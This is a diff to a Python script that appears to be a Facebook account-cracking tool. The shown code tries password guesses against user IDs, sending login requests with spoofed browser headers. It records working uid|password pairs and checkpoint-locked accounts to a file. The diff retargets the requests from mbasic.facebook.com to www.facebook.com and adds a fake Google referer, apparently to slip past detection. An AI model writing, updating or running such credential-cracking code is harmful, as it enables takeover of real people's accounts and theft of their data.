@@ -128,19 +128,17 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-    'authority': 'mbasic.facebook.com',
+    'authority': 'www.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-BD,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
     'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
+    'referer': 'https://www.google.com/',
     'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"9.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'cross-site',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
@@ -154,13 +152,13 @@ class Main:
 				self.ok.append("%s|%s"%(uid, pw))
 				open(okc,"a").write(" %s|%s\n"%(uid, pw))
 				break
-			elif "mbasic.facebook.com" in response.json()["error_msg"]:
+			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ DCA ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open(okc,"a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
-				#print("\r \033[0;92m[ Finding ] %s | %s\033[0;97m         "%(uid, pw))
+				#print("\r \033[1;36m[ Finding ] %s | %s\033[0;97m         "%(uid, pw))
 				continue
 
 		self.loop +=1
